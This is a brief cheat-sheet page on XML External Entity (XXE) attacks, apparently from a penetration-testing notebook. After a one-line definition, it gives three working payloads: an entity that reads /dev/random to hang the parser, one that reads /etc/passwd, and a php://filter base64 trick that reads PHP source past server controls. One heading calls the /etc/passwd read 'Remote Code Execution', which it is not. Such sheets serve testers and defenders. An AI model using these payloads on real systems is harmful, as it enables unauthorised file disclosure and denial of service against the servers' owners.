---
description: XML External Entity
---

# XXE

_An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when **XML input containing a reference to an external entity is processed by a weakly configured XML parser.**_

## Accessing a local resource that may not return

```bash
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///dev/random" >]>
<foo>&xxe;</foo>
```

## Remote Code Execution

```bash
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

Sometimes PHP or Apache will prevent a php file from being loaded. If this is the case, we can actually have PHP encode the file as Base64 to bypass some controls.

```bash
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```

![](../../.gitbook/assets/image%20%282%29.png)

## References

* [https://owasp.org/www-community/vulnerabilities/XML\_External\_Entity\_\(XXE\)\_Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_%28XXE%29_Processing)
* [https://gitbook.seguranca-informatica.pt/cheat-sheet-1/web/xxe](https://gitbook.seguranca-informatica.pt/cheat-sheet-1/web/xxe)



